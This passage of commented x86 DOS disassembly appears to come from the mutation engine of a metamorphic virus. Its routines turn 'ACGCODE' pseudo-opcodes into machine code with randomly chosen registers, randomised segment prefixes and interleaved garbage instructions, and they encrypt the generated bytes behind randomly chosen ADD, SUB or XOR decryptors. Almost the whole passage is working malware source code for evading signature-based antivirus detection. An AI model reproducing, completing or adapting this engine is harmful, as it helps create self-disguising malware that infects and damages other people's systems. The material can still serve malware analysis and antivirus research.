   cmp	al, 8
   jb	locret_0_2399	 ; use this value as Segment Register
   sub	al, 8		 ; for S1,S2,S3	look in	table
   push	bx
   mov	bx, offset Segment_Selection ; table contains ES,FS,GS randomly	ordered
   xlat
   pop	bx

locret_0_2399:
   retn
Select_Segment_from_Table endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Check_Segment_Prefix proc near
   push	ax
   mov	al, Memory_Segment_Register
   cmp	al, 0FFh
   jz	loc_0_23AA	 ; skip	if no prefix
   call	Store_Segment_Prefix
   mov	Memory_Segment_Register, 0FFh

loc_0_23AA:
   pop	ax
   retn
Check_Segment_Prefix endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Prefix_Segment proc near
   and	al, 0Fh
   call	Select_Segment_from_Table
   mov	Memory_Segment_Register, al
   retn
ACGCODE_Prefix_Segment endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Declare_Local_Variable proc near
   and	al, 3
   inc	al
   mov	cl, al		 ; CL =	1..4
   call	_Get_ACGCODE_Byte
   mov	di, ax
   and	edi, 7Fh	 ; EDI=index in	WP
   call	Choose_Register_Smart ;	select register
   mov  dl, ch          
   mov  dh, 0FFh         ; use register
   call	Save_Reg_in_WorkPlace
   retn
ACGCODE_Declare_Local_Variable endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Free_Local_Variable proc near
   call	_Get_ACGCODE_Byte
   mov	di, ax
   call	Delete_Reg_in_WorkPlace
   retn
ACGCODE_Free_Local_Variable endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Offset proc near
   call	_Get_ACGCODE_Byte
   mov	di, ax		 ; index in workplace
   call	Check_BX_SI_DI
   mov	al, 3
   call	_setRegUsed
   mov	eax, 1070000h	 ; BX
   cmp	ch, 3
   jz	loc_0_2405
   mov	eax, 1040000h	 ; SI
   cmp	ch, 6
   jz	loc_0_2405
   mov	eax, 1050000h	 ; DI

loc_0_2405:
   mov	Operand_Ampersand, eax
   retn
ACGCODE_Offset endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Operation proc near
   mov	cl, al
   and	cl, 3
   inc	cl		 ; CL =	1..4 = OperandSize
   shr	al, 3
   cmp	al, 1		 ; AL=1	--> reg,reg
   jnz	loc_0_243E
   call	_Get_ACGCODE_Byte ; get	argument
   mov	si, ax		 ; ESI=target
   call	_Get_ACGCODE_Byte ; get	argument
   mov	di, ax		 ; EDI=source
   call	_getRND_in_DX
   and	dx, 1
   jz	loc_0_2437	 ; select to/from register
   mov	bl, 2		 ; (BL=2 --> first read	argument will be target	= ESI)

loc_0_242F:
   call	ESI_WPindex_to_ESI_register_EDI_WPindex
   call	Touch_EDI2
   jmp	short loc_0_2469
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_2437:
   mov	bl, 0
   xchg	edi, esi	 ; exchange order
   jmp	short loc_0_242F
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_243E:		 ; AL=3	--> mem,imm
   cmp	al, 3
   jz	loc_0_2446
   cmp	al, 2		 ; AL=2	--> mem,imm
   jnz	loc_0_2454

loc_0_2446:
   mov	bl, 4
   call	_get_offset_Variable ; (store it in EDI)
   call	get_Immediate_Value
   mov	esi, eax	 ; ESI = Immediate Value
			 ; EDI = Variable Offset
   jmp	short loc_0_2469
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_2454:		 ; AL=4	--> reg,mem
   cmp	al, 4
   mov	bl, 2
   jz	loc_0_245C
   mov	bl, 0		 ; AL=5	--> mem,reg

loc_0_245C:
   call	_Get_ACGCODE_Byte
   mov	si, ax		 ; ESI = index in WP
   call	ESI_WPindex_to_ESI_register_EDI_WPindex
   call	_get_offset_Variable ; EDI = Variable offset

loc_0_2469:		 ; get operation
   call	_Get_ACGCODE_Byte
   mov	bh, al
   call _Check_for_SAVEFLAGS ; check prefix
   call	Do_CALL3
   call	_Check_Segment_Prefix ;	store prefix if	needed
   call	_Do_Instruction5
   call	Check_CALL
   retn
ACGCODE_Operation endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Inc proc near
   call	_get_offset_Variable
   and	al, 3
   mov	cl, al
   inc	cl		 ; CL=1,2,4
   call	_Check_for_SAVEFLAGS
   call	_Check_Segment_Prefix
   call	Do_INC2
   retn
ACGCODE_Inc endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Dec proc near
   call	_get_offset_Variable
   and	al, 3
   mov	cl, al
   inc	cl
   call	_Check_for_SAVEFLAGS
   call	_Check_Segment_Prefix
   call	Do_DEC2
   retn
ACGCODE_Dec endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Rotate proc near
   and	al, 3
   mov	cl, al
   inc	cl
   call	_Get_ACGCODE_Byte
   mov	bl, al
   call	_get_offset_Variable
   mov	bh, 4
   call	_getRND_in_DX
   jns	loc_0_24C8
   mov	bh, 0

loc_0_24C8:
   call	_Check_for_SAVEFLAGS
   call	_Generate_4times_Garbage
   call	_Check_Segment_Prefix
   call	Do_SHIFT2
   retn
ACGCODE_Rotate endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Shift proc near
   and	al, 3
   mov	cl, al
   inc	cl
   call	_Get_ACGCODE_Byte
   mov	bl, al
   call	_get_offset_Variable
   mov	bh, 5
   call	_Check_for_SAVEFLAGS
   call	_Generate_4times_Garbage
   call	_Check_Segment_Prefix
   call	Do_SHIFT2
   retn
ACGCODE_Shift endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Pop proc near
   call	_get_offset_Variable
   and	al, 3
   mov	cl, al
   inc	cl
   call	_Check_for_SAVEFLAGS
   call	_Generate_4times_Garbage
   call	_Check_Segment_Prefix
   call	Do_POP
   retn
ACGCODE_Pop endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Push proc near
   call	_get_offset_Variable
   and	al, 3
   mov	cl, al
   inc	cl
   call	_Check_for_SAVEFLAGS
   call	_Generate_4times_Garbage
   call	_Check_Segment_Prefix
   call	Do_PUSH
   retn
ACGCODE_Push endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_MOV_seg_mem proc near
   call	_Generate_4times_Garbage
   call	_get_offset_Variable
   and	al, 0Fh
   call	Select_Segment_from_Table
   mov	ah, 0
   mov	si, ax
   call	_Check_for_SAVEFLAGS
   call	_Generate_4times_Garbage
   call	_Check_Segment_Prefix
   call	Do_MOV_seg_mem
   call	_Generate_4times_Garbage
   retn
ACGCODE_MOV_seg_mem endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_MOV_mem_seg proc near
   call	_Generate_4times_Garbage
   call	_get_offset_Variable
   and	al, 0Fh
   call	Select_Segment_from_Table
   mov	ah, 0
   mov	si, ax
   call	_Check_for_SAVEFLAGS
   call	_Generate_4times_Garbage
   call	_Check_Segment_Prefix
   call	Do_MOV_mem_seg
   call	_Generate_4times_Garbage
   retn
ACGCODE_MOV_mem_seg endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Adjust_Registers proc near
   push	dx
   push	edi
   movzx ebx, bx
   xor	edi, edi
   cmp	word ptr gs:[bx+2], 0 ;	used?
   jz	loc_0_25BB

loc_0_2589:
   cmp	word ptr gs:[edi+edi+7Eh], 0
   jz	loc_0_25B4
   mov	dx, gs:[ebx+edi*2+4]
   cmp	dx, gs:[edi+edi]
   jz	loc_0_25B4
   cmp	dh, 0FFh
   jnz	loc_0_25B0
   mov	ch, dl
   mov	cl, gs:[edi+edi+7Eh]
   call	_Discard_Used_Register3

loc_0_25B0:
   call	_convert_WorkPlace_Reg

loc_0_25B4:
   inc	di
   cmp	di, gs:[bx+2]
   jb	loc_0_2589

loc_0_25BB:
   pop	edi
   pop	dx
   retn
Adjust_Registers endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Declare_IP proc	near
   call	_get_ACGCODE_Word
   movzx ebx, ax	 ; EBX = index to WorkPlace
   call	_Get_ACGCODE_Byte
   movzx dx, al         
   mov	ax, Instruction_Offset
   add	ax, D_CODEBASE	 ; convert into	IP
   mov	gs:[bx], ax	 ; AX =	IP of actual location
   mov	gs:[bx+2], dx
   or	dx, dx
   jz	locret_0_25F3
   xor	esi, esi	 ; WARNING! allocated variables	before jump should be the same than just before	the jump instruction
			 ; (so that local varables are allocated at same place,	and will be rearranged properly, if needed)

loc_0_25E3:		 ; save	state of variables, so when jumpping to	this IP, every variable	is at the same place
   mov	ax, gs:[esi+esi]
   mov	gs:[ebx+esi*2+4], ax ; (or else, before	jumpping, it will be rearranged	properly)
   inc	si
   cmp	si, dx
   jb	loc_0_25E3

locret_0_25F3:
   retn
ACGCODE_Declare_IP endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Declare_Target_Jump proc near
   push	Instruction_Offset
   mov	cx, 4
   call	_Allocate_Code_Space ; Find space for 4	bytes
   mov	Instruction_Offset, dx
   call	ACGCODE_Declare_IP
   pop	Instruction_Offset
   retn
ACGCODE_Declare_Target_Jump endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Adjust_and_Jump	proc near
   call	_get_ACGCODE_Word
   mov	bx, ax
   call	Adjust_Registers
   mov	dx, gs:[bx]
   sub	dx, D_CODEBASE
   push	dx
   call	_getRND_in_DX
   cmp	dh, 40h
   pop	dx
   jnb	loc_0_262A
   xchg	dx, Instruction_Offset

loc_0_262A:
   call	Create_Jump_to_Next_Instruction
   retn
ACGCODE_Adjust_and_Jump	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Jump proc near
   mov	bh, al
   and	bh, 1Fh
   push	bx
   call	_get_ACGCODE_Word
   mov	bx, ax		 ; BX =	index to WorkPlace
   call Adjust_Registers 
   mov	dx, gs:[bx]	 ; DX =	offset of target jump
   pop	bx		 ; BX =	type of	jump
   call	Create_Jump
   retn
ACGCODE_Jump endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Declare_Global_Variable	proc near
   call	_get_ACGCODE_Word
   mov	bx, ax		 ; BX =	index to WorkPlace
   call	_get_ACGCODE_Word
   mov	cx, ax		 ; CX =	size of	this variable
   call	_Allocate_Code_Space
   add	dx, D_CODEBASE
   mov	gs:[bx], dx	 ; DX =	IP of allocated	space for variable
   and  word ptr gs:[bx+2], 0
   retn
ACGCODE_Declare_Global_Variable	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Load_Variables proc near
   pushad

more_Variables:
   call	_Get_ACGCODE_Byte
   cmp	al, 0FFh
   jz	loc_0_26BC	 ; EndOfVariables
   mov	cl, gs:[si]
   mov	ch, 0
   shl	cx, 4		 ; CH=register
   shr	cl, 4		 ; CL=size
   cmp	al, 0F0h
   jb	loc_0_269B	 ; input is variable, not inmediate
   call	_Discard_Used_Register3	; free this register, if is already used
   call	get_Immediate_Value
   push	si
   mov	esi, eax
   mov	al, 1
   call	_setRegUsed
   movzx edi, ch
   mov	bh, 0FFh	 ; (MOV	operation)
   mov	bl, 4		 ; (inmediate)
   call	_Do_Instruction5
   pop	si
   jmp	short loc_0_26B9
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_269B:
   mov	di, ax
   push	cx
   call	_get_WPregister_BX_CL ;	BX=input variable (before)
   pop	dx
   mov	dh, 0FFh	 ; DX=input variable after
   mov	dl, ch
   cmp	dx, bx
   jz	loc_0_26B3	 ; same, so no reassignation required
   call	_Discard_Used_Register2
   call	_convert_WorkPlace_Reg ; (EDI=WPindex of source	; DX=target)

loc_0_26B3:
   mov	al, 3
   call	_setRegUsed

loc_0_26B9:
   inc	si
   jmp	short more_Variables
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_26BC:
   popad
   nop
   retn
Load_Variables endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Proc proc near
   call	_get_ACGCODE_Word
   mov	bx, ax		 ; BX =	index to WorkPlace
   mov	Procedure_WPindex, bx
   call	_Get_ACGCODE_Byte ; get	byte (CL) = number of input variables
   mov	cl, al
   call	_Get_ACGCODE_Byte ; get	byte (CH) = number of output variables
   mov	ch, al
   push	cx
   mov	cx, 4
   call	_Allocate_Code_Space
   mov	Instruction_Offset, dx ; set offset of next instruction
   add	dx, D_CODEBASE	 ; convert into	IP
   mov	gs:[bx], dx	 ; DX =	IP of actual location
   pop	cx
   mov	gs:[bx+2], cx	 ; info	about use of regs
   push	cx
   mov	dl, 0

get_INPUT_Variables:	 ; get byte
   call	_Get_ACGCODE_Byte
   sub	al, 4
   cmp	al, 4
   jnb	loc_0_2713
   push	dx
   push	bx
   call	ACGCODE_Declare_Local_Variable
   pop	bx
   pop	dx
   call sub_0_12EC      
   shl	ch, 4
   or	cl, ch
   mov	gs:[bx+6], cl
   inc	bx
   inc	dl
   jmp	short get_INPUT_Variables
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_2713:
   pop	cx
   call Reset_Used_Regs  
   enter 20h, 1
   mov	di, bp
   sub	di, 20h
   push	es
   push	ds
   pop	es
   assume es:seg000
   mov	si, offset Used_AX
   push	di
   push	cx
   mov	cx, 10h
   cld
   repe	movsw		 ; make	copy of	reg info (use and size)
   mov	di, offset Used_AX
   mov	cx, 10h
   xor	ax, ax
   repe	stosw		 ; free	all regs (Used_X, Size_X)
   push Instruction_Offset
   mov	dl, 0

get_OUTPUT_Variables:
   call	_Get_ACGCODE_Byte
   sub	al, 4
   cmp	al, 4
   jnb	loc_0_2763
   mov	cl, al
   inc	cl		 ; CL =	size of	this operand
   call	Choose_Register_Smart ;	find a register	for use	(and possibly discard others to	memory/registers)
   mov  al, 1            
   call	_setRegUsed
   shl	ch, 4
   or	cl, ch
   mov	gs:[bx+6], cl	 ; save	info about this	output variable	in WP
   inc	bx
   inc	dl
   jmp	short get_OUTPUT_Variables ; get next output variable
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_2763:
   pop	cx
   pop	cx
   mov	di, offset Used_AX
   mov	cx, 10h
   pop	si
   repe	movsw		 ; restore reg info (use and size)
   mov	di, offset Free_AX
   mov	cx, 8
   xor	ax, ax
   repe stosw            ; restore state of registers
   pop	es
   assume es:nothing
   leave
   retn
ACGCODE_Proc endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_EndProc	proc near
   mov	si, Procedure_WPindex
   xor	dx, dx
   xor	bx, bx

loc_0_2783:
   shl	dx, 1
   cmp	byte ptr Free_AX[bx], 0
   jz	loc_0_278F
   or	dl, 1		 ; changed register

loc_0_278F:
   mov	byte ptr Free_AX[bx], 1
   inc	bx
   cmp	bx, 10h
   jb	loc_0_2783
   mov  gs:[si+4], dx    ; changed registers
   and	Procedure_WPindex, 0
   retn
ACGCODE_EndProc	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Save_Changeable_Registers proc near
   push	bx
   push	cx
   push	dx
   mov	Dont_Use_Exchange_For_MOV_operation, 1 ; (so that we play with the correct registers)
   call	Reset_Used_Regs
   xor	bx, bx
   mov	cl, 1		 ; 8-bit registers

loc_0_27B3:
   call	RegIndex_to_CH
   or	dx, dx		 ; (the	most significant bit refers to AL)
   jns	loc_0_27C3	 ; this	register will not be changed (inside the Proc)
   call	_Discard_Used_Register2	; save this register to	a safe place
   mov	byte ptr Free_AX[bx], 1	; its free from	now on

loc_0_27C3:
   shl	dx, 1
   inc	bx
   cmp	bx, 8
   jb	loc_0_27B3	 ; next	8-bit register
   mov	cl, 2		 ; 16-bit registers

loc_0_27CD:
   call	RegIndex_to_CH
   test	dh, 0C0h
   jz	loc_0_27DF	 ; register will not be	changed
   call	_Discard_Used_Register2
   mov	Free_AX[bx], 101h

loc_0_27DF:
   shl	dx, 2
   add	bx, 2
   cmp	bx, 10h
   jb   loc_0_27CD       ; next 16-bit register
   mov	Dont_Use_Exchange_For_MOV_operation, 0
   pop	dx
   pop	cx
   pop	bx
   retn
Save_Changeable_Registers endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Return_Variable	proc near
   mov	si, Procedure_WPindex
   mov	bl, gs:[si+2]	 ; BL=number of	input registers
   mov	bh, 0
   add	si, 6
   add	si, bx		 ; ESI=start of	output registers (skipping input registers)
   call	Load_Variables
   call	Do_Procedure_Return
   call	Reset_Used_Regs
   retn
ACGCODE_Return_Variable	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Prepare_Before_Call proc near
   push	dx
   add	si, 6
   call	Load_Variables	 ; load	input variables	of the Proc
   sub	si, 6
   mov  dx, gs:[si+4]    ; changed registers
   mov	SaveFlags, 0FFh
   call	Save_Changeable_Registers ; save registers that	will be	changed	by the Proc
   pop	dx
   retn
Prepare_Before_Call endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Prepare_After_Call proc	near
   pusha
   mov	SaveFlags, 0FFh
   push	edi
   mov	di, si
   mov	bl, gs:[si+2]
   mov	bh, 0
   add	di, bx
   add	di, 6		 ; EDI = start of output registers
   mov	bl, gs:[si+3]	 ; BL=number of	output registers

loc_0_283D:
   or	bl, bl
   jz	loc_0_2880	 ; finished
   push	bx
   push	di
   call	_Get_ACGCODE_Byte ; get	index in WP
   mov	cl, gs:[di]
   mov	ch, 0
   shl	cx, 4		 ; CH=register=where Proc has returned variable
   shr	cl, 4		 ; CL=size
   mov  ah, cl           ;
   mov	di, ax		 ; EDI=index in	WP, that specifies where variable should be returned
   call	_get_WPregister_BX_CL
   cmp	bh, 0FFh
   jnz	loc_0_2863	 ; variable returned in	memory
   cmp	bl, ch
   jz	loc_0_2879	 ; register is returned	in the correct register

loc_0_2863:
   call	_IsRegUsed
   and	al, 2
   call	_setRegUsed
   call	_Discard_Used_Register2
   mov	dh, 0FFh
   mov	dl, ch
   call	_convert_WorkPlace_Reg2	; (EDI=WPindex of source ; DX=target)

loc_0_2879:
   pop	di
   pop	bx
   inc	di
   dec	bl
   jmp	short loc_0_283D ; previous output variable
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_2880:		 ; AL=FF (EndOfVariables) (same	as Input variables)
   call	_Get_ACGCODE_Byte
   call	Reset_Used_Regs
   mov	SaveFlags, 0
   pop	edi
   popa
   retn
Prepare_After_Call endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_Call_Proc proc near
   call	_get_ACGCODE_Word
   mov	si, ax		 ; SI =	index in WP of the Proc
   call	Prepare_Before_Call
   mov	dx, gs:[si]	 ; target IP
   call	Do_CALL
   call	Prepare_After_Call
   retn
ACGCODE_Call_Proc endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_ASM proc near
   and  word ptr gs:0FDh, 0 ; special for "asm-enda"
   call	_Get_ACGCODE_Byte
   mov	cl, al
   neg	cl
   call	_get_ACGCODE_Word
   xchg	al, ah
   mov	gs:0FFh, ax
   call	_get_ACGCODE_Word
   mov	gs:101h, ax
   mov	bx, 103h
   or	cl, cl
   jz	loc_0_28D6

loc_0_28CA:
   call	_Get_ACGCODE_Byte
   mov	gs:[bx], al
   inc	bx
   dec	cl
   jnz	loc_0_28CA

loc_0_28D6:
   mov	si, 0FDh
   call	Prepare_Before_Call
   call	_get_ACGCODE_Word
   mov	cx, ax
   jcxz	loc_0_28F2

loc_0_28E4:
   call	_Get_ACGCODE_Byte
   call	_Store_Instruction_Byte
   loop	loc_0_28E4
   call	_Copy_Instruction

loc_0_28F2:
   call	Prepare_After_Call
   call	_getRND_in_DX
   jns	locret_0_2909
   mov	cl, 4
   and	dl, 7
   mov	ch, dl
   call	Avoid_SP_Reg
   call	_Discard_Used_Register3

locret_0_2909:
   retn
ACGCODE_ASM endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_GETSD proc near
   call	_Get_ACGCODE_Byte
   mov	di, ax
   call _get_WPregister_BX_CL ; get register from workplace
   call	Check_BX_SI_DI	 ; force to use	BX, SI or DI
   mov	al, 3
   call	_setRegUsed
   mov	edi, 1070000h
   cmp	ch, 3
   jz	loc_0_2939
   mov	edi, 1040000h
   cmp	ch, 6
   jz	loc_0_2939
   mov	edi, 1050000h

loc_0_2939:
   mov	ebp, edi
   call	_Get_ACGCODE_Byte
   mov	di, ax
   call	_get_WPregister_BX_CL
   call	Choose_Register_Smart
   xor	ch, 4
   call	Discard_Used_Register
   mov	al, 1
   mov	cl, 2
   and	ch, 3
   call	_setRegUsed
   mov	cl, 1
   mov	dl, ch
   mov	dh, 0FFh
   cmp	byte_0_350, 1
   jnz	loc_0_296A
   or	dl, 4

loc_0_296A:
   mov	ch, dl
   mov	al, 0
   call	_setRegUsed
   call	_convert_WorkPlace_Reg2
   movzx esi, ch
   and	si, 3
   mov	edi, ebp
   call	sub_0_F90
   call	Reset_Used_Regs
   retn
ACGCODE_GETSD endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


get_Space_for_StaticData proc near
   push	cx
   push	edx
   mov	cx, 8
   call	_Allocate_Code_Space
   add	dx, D_CODEBASE
   shl	edx, 10h
   call	_getRND_in_DX
   ror	edx, 10h	 ; choose random relative segment
   mov	StaticData_ACGCODES_Pointer, edx
   pop	edx
   pop	cx
   retn
get_Space_for_StaticData endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Encrypt_ACGCODE_Byte proc near
   push	eax
   push	ecx
   push	edx
   push	esi
   mov	esi, StaticData_ACGCODES_Pointer
   call	Encrypt_Byte
   sub	si, D_CODEBASE
   mov	ecx, es:[si]
   mov	edx, InitialDecryptState
   and	eax, edx
   not	edx
   and	ecx, edx
   or	ecx, eax
   mov	es:[si], ecx	 ; store it
   pop	esi
   pop	edx
   pop	ecx
   pop	eax
   retn
Encrypt_ACGCODE_Byte endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


Encrypt_Store_ACGCODE_Byte proc	near
   pushad
   mov	ah, 0
   mov	dx, word ptr StaticData_ACGCODES_Pointer
   sub	dx, D_CODEBASE
   add  dx, 8            
   mov	cx, 1
   push	ax
   call	_Enough_Code_Space ; be	sure there is space for	this byte
   cmp	al, 0
   pop	ax
   jnz	loc_0_2A19	 ; break it here
   cmp	al, DecryptOffset ; if its an specific byte do it differently
   jz	loc_0_2A19	 ; break it here
   call	Mark_Space_Used
   call	Encrypt_ACGCODE_Byte
   mov	edx, StaticData_ACGCODES_Pointer
   add  edx, StaticData_ACGCODES_Pointer_Increment ; add 1
   mov	StaticData_ACGCODES_Pointer, edx
   jmp	short loc_0_2A8D
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_2A19:
   push	ax
   mov	al, DecryptOffset
   call	Encrypt_ACGCODE_Byte
   mov	cx, 8		 ; (smallest pieces is 8 bytes)
   call	_Allocate_Code_Space ; find free bytes
   add	dx, D_CODEBASE
   mov	di, dx
   call	_getRND_in_DX
   shl	edi, 10h
   mov	di, dx
   ror	edi, 10h
   mov	edx, StaticData_ACGCODES_Pointer
   mov	si, dx
   sub	si, D_CODEBASE
   add	edx, StaticData_ACGCODES_Pointer_Increment
   add	dx, 3
   xor	eax, eax
   pop	ax
   mov	ebx, 0FFFFFF00h
   mov	cl, byte_0_353
   shl	eax, cl
   rol	ebx, cl
   and	edi, ebx
   or	edi, eax
   mov	ebp, edi
   mov	al, DecryptOperation ; AL = 0 ,	5 , 6
   cmp	al, 0		 ; (decryption will be ADD)
   jz	loc_0_2A7B
   cmp	al, 5		 ; (decryption will be SUB)
   jz	loc_0_2A80
   xor	edi, edx	 ; XOR
   jmp	short loc_0_2A83
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_2A7B:		 ; SUB
   sub	edi, edx
   jmp	short loc_0_2A83
; ФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФФ

loc_0_2A80:		 ; ADD
   add	edi, edx

loc_0_2A83:
   mov	es:[si+4], edi
   mov	StaticData_ACGCODES_Pointer, ebp

loc_0_2A8D:
   popad
   nop
   retn
Encrypt_Store_ACGCODE_Byte endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_STARTSD	proc near
   call	_get_ACGCODE_Word
   mov	bx, ax		 ; BX =	index in WP
   call	_Get_ACGCODE_Byte
   mov	di, ax		 ; DI =	index in WP
   call	Touch_EDI2
   mov	esi, StaticData_ACGCODES_Start
   cmp	bx, 0FFFFh
   jz	loc_0_2AAE	 ; jump	if static data requested is the	beginning of ACGCODES
   mov	esi, gs:[bx]	 ; get start of	static data

loc_0_2AAE:
   mov	cl, 4
   mov	bl, 4
   mov	bh, 0FFh
   call	_Do_Instruction5 ; MOV reg/mem,	offset_StaticData
   retn
ACGCODE_STARTSD	endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_STATICDATA proc	near
   call	_get_ACGCODE_Word
   mov	bx, ax		 ; BX=index in WP
   call	_get_ACGCODE_Word
   mov	cx, ax		 ; CX=number of	bytes
   push	word ptr D_SEL_DWORD
   test	byte ptr D_SEL_DWORD, 1
   jz	loc_0_2AD3
   call	get_Space_for_StaticData

loc_0_2AD3:		 ; clear bit 0 so that these bytes will	be stored (and encrypted)
   and	byte ptr D_SEL_DWORD, 0FEh
   mov	esi, StaticData_ACGCODES_Pointer ; start of static data	(which are also	ACGCODE	bytes that are stored and encrypted)
   mov	gs:[bx], esi	 ; save	start of this static data

loc_0_2AE1:
   call	_Get_ACGCODE_Byte
   loop	loc_0_2AE1	 ; store ACGCODE (which	happen to be the static	data)
   pop	word ptr D_SEL_DWORD
   retn
ACGCODE_STATICDATA endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_SAVEFLAGS proc near
   mov	SaveFlags, 1	 ; preserve cpu	flags
   pop	si
   push	offset Next_ACGCODE2 ; jump to Next_ACG_CODE label but do not clear SaveFlags
   retn
ACGCODE_SAVEFLAGS endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_FREEREGS proc near
   mov	cl, 4
   xor	edi, edi
   mov	dx, 0FF00h

loc_0_2AFE:
   call	Save_Reg_in_WorkPlace
   inc	di
   inc	dx
   cmp	dl, 4
   jnz	loc_0_2B09
   inc	dx

loc_0_2B09:
   cmp	dl, 8
   jb	loc_0_2AFE
   retn
ACGCODE_FREEREGS endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_ALLOCREGS proc near
   mov	cl, 4
   xor	edi, edi
   mov	dx, 0FF00h

loc_0_2B17:
   call	_get_WPregister_BX_CL
   cmp	dx, bx
   jz	loc_0_2B29
   mov	ch, dl
   call	_Discard_Used_Register2
   call	_convert_WorkPlace_Reg

loc_0_2B29:
   inc	di
   inc	dx
   cmp	dl, 4
   jnz	loc_0_2B31
   inc	dx

loc_0_2B31:
   cmp	dl, 8
   jb	loc_0_2B17
   retn
ACGCODE_ALLOCREGS endp


; ллллллллллллллл S U B	R O U T	I N E ллллллллллллллллллллллллллллллллллллллл


ACGCODE_IF proc	near
   call	_Get_ACGCODE_Byte ; CL
   mov	cl, al
   call	_get_ACGCODE_Word ; number of bytes
   mov	edx, D_SEL_DWORD
   shr	edx, cl
   and	dl, 1
   shr	cl, 5		 ; (CL=0 --> IF	 ; CL=1	--> IFNOT)
   cmp	cl, dl
   jnz	locret_0_2B5B	 ; jump	if we decide to	include	code
   mov	cx, ax

loc_0_2B55:
   call	_Get_ACGCODE_Byte
   loop	loc_0_2B55	 ; skip	all these ACGCODES

locret_0_2B5B:
   retn
ACGCODE_IF endp


